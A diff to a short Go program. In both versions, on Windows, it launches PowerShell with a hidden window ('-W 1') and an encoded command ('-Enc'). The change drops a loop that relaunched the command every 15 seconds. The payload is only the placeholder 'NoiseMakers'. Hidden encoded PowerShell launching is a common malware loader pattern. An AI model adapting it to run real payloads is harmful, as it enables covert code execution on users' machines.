@@ -2,9 +2,8 @@ package main
 
 import (
     "fmt"
-    "time"
-    "os/exec"
     "runtime"
+    "os/exec"
 )
 
 var (
@@ -32,15 +31,12 @@ func Popen(command string, args ...interface{}) {
 }
 
 func main() {
-    for {
-        if runtime.GOOS == "windows" {
-            encodedCommand := "NoiseMakers"
-            time.Sleep(15 * time.Second)
-            Popen("powershell -W 1 -Enc %s", encodedCommand)
-        } else {
-            // For other OSes, you can use a similar approach
-            // For example, to open a text editor on Linux:
-            // Popen("xdg-open /path/to/your/file.txt")
-        }
+    if runtime.GOOS == "windows" {
+        encodedCommand := "NoiseMakers"
+        Popen("powershell -W 1 -Enc %s", encodedCommand)
+    } else {
+        // For other OSes, you can use a similar approach
+        // For example, to open a text editor on Linux:
+        // Popen("xdg-open /path/to/your/file.txt")
     }
 }
